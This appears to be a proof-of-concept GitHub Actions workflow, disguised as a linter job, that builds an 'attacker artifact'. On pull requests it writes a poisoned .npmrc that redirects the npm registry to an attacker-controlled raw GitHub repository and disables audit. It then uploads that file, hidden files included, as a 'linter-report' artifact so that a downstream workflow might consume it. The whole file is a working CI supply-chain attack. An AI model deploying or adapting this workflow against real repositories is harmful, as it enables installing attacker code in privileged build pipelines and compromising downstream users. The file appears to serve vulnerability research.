name: XD Lint
on:
  pull_request:
    branches: [main]

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - name: build attacker artifact
        run: |
          mkdir -p out
          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-wfr-artifact/main/xdreg2/\naudit=false\nfund=false\nprogress=false\n' > out/.npmrc
          printf 'XD attacker-controlled linter report\n' > out/linter-report.txt
          echo "${{ github.event.pull_request.number }}" > out/pr-number.txt
          ls -la out
      - uses: actions/upload-artifact@v7
        with:
          name: linter-report
          path: out/
          include-hidden-files: true
          if-no-files-found: error

